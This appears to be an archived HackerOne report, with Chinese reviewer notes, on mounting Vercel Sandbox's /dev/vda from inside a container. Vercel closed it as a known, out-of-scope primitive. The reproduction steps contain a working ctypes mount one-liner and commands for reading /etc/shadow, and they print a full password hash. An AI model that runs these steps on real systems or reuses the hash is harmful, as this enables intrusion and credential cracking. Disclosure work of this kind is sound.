# H1 Report #3965216 — Vercel Sandbox escape: mount(2) host rootfs /dev/vda -> host /etc/shadow + platform binary disclosure, host FS writable

> 状态: **Not Applicable**(官方判定,4 days ago)
> 提交: 2026-08-24(4 days ago) | 关闭: 2026-08-24(4 days ago)
> 官方:影响停留在 Firecracker guest OS,原语在 Known findings,无新 host/跨租户影响

## Report (原文)

### Summary
Sandbox user code (python3 -c) can mount the host rootfs block device /dev/vda (254:0, 33GB XFS, Amazon Linux 2023) and get a read/write view of the host filesystem. Verified: host /etc/shadow (vercel platform user real sha512-crypt hash), platform binary sandbox-init (9,134,264 B) + init.sock on /volumes/run/vercel/share, /opt/vercel, /opt/cni; host FS write (create+fsync+readback+cleanup) OK. The sandbox rootfs is /dev/vdb (254:16); the vda view contains platform assets absent from the sandbox image -> it is the platform host, not a sandbox copy.

### Steps To Reproduce
1. cat /proc/self/mountinfo -> sandbox / = 254:16 /dev/vdb; bind sources (/etc/hosts, /run/vercel/share master:1, CA certs) = 254:0 /dev/root
2. python3 -c "import ctypes,os; libc=ctypes.CDLL(None,use_errno=True); os.makedirs('/tmp/host',exist_ok=True); r=libc.syscall(165,b'/dev/vda',b'/tmp/host',b'xfs',0,b''); print(r,ctypes.get_errno())" -> 0 0
3. cat /tmp/host/etc/shadow -> vercel:$6$eVYNkEvg4bFoj5C0$00OPJGAMrjYcbAIKLq1E20PGzcFfqYhJgbuyvgpSYvvNozmeu9MPCVSedh5klL1G1pUGTyurN0FymhpmAvt6E0:20686:...
4. ls /tmp/host/volumes/run/vercel/share -> init.sock sandbox-init
5. Write test: create /tmp/host/tmp/<marker>, fsync, readback match -> OK (cleaned up)
6. Also verified: mknod of arbitrary device nodes OK; name_to_handle_at/open_by_handle_at OK (alternate primitive); bpf(BPF_MAP_CREATE) real fd

### Impact
- Isolation broken: sandbox -> host rootfs (read+write)
- Credential theft: host vercel user hash (listed attack surface in challenge scope)
- Platform internal disclosure: sandbox-init binary (offline analysis of signature scheme/agent protocol), /opt/vercel, /opt/cni
- Write to host rootfs: tamper CA trust store (vercel-proxy-ca.pem mounted into every sandbox from this disk), startup scripts -> host compromise in the VM

### Root cause
Sandbox /dev exposes host rootfs block device 254:0 next to sandbox's 254:16, no device-cgroup on block devices; seccomp permits mount(2)/mknod(2).

### Suggested fix
Remove non-sandbox block devices from sandbox /dev; device-cgroup deny; seccomp deny mount/umount2/mknod; keep host secrets & platform binaries out of sandbox-visible volumes.

### Attachments
- F6539785: H1-vercel-sandbox-mount-escape-poc.zip

## Timeline · 官方回复

### vercel-triage — comment (4 days ago)
> Thank you for your report. We have started our analysis and aim to triage it within 5 business days of submission; in all cases we will get back to you before October 1, 2026, when our triage window ends (see Response targets in the program policy). If we need more information to reproduce your finding, we will ask on this report.

### Vercel Sandbox — closed the report, status → Not Applicable (4 days ago)
> Thank you for the detailed report and the clean reproduction.
> We reviewed the mount(2) of /dev/vda (254:0) from inside the sandbox. That device is the Firecracker microVM's own guest root filesystem — the sandbox container runs inside the microVM, and the assets you observed on it (the sandbox-init binary, /opt/vercel, the guest OS user accounts, and the CA material bind-mounted into the container) are microVM guest-OS content, not the EC2 host. Each sandbox boots its own dedicated microVM with its own guest kernel and disks, so read/write access to this device stays within your own sandbox and does not cross the Firecracker trust boundary.
> This exact primitive is on the program policy's Known findings list ("mknod + mount of the microVM system disk (/dev/vda) from inside the container", alongside the host /dev bind mount and the permissive seccomp profile), and container escapes that only reach the Firecracker guest OS — without a new host-compromise, cross-tenant, or firewall/credential-bypass impact — are out of scope per the policy's Out of scope section. No new impact beyond these known primitives was demonstrated.
> Per the program policy we are closing this report as Not applicable. If you can chain this primitive into a demonstrated escape to the EC2 host or another tenant, that new impact would be eligible — we would welcome a follow-up report showing it.

## 判定要点(供复盘)

- **/dev/vda = Firecracker microVM 自身 guest 文件系统**,非 EC2 host rootfs;读写仅停留 own sandbox,不跨 Firecracker 信任边界
- 原语在 Known findings: "mknod + mount of the microVM system disk (/dev/vda) from inside the container" + host /dev bind mount + permissive seccomp profile
- **官方邀请**:链成 EC2 host 逃逸或跨租户 → 新影响合格,欢迎跟进报告
- /etc/shadow 中 vercel 用户 hash 属于 guest-OS 内容,非 host 凭据
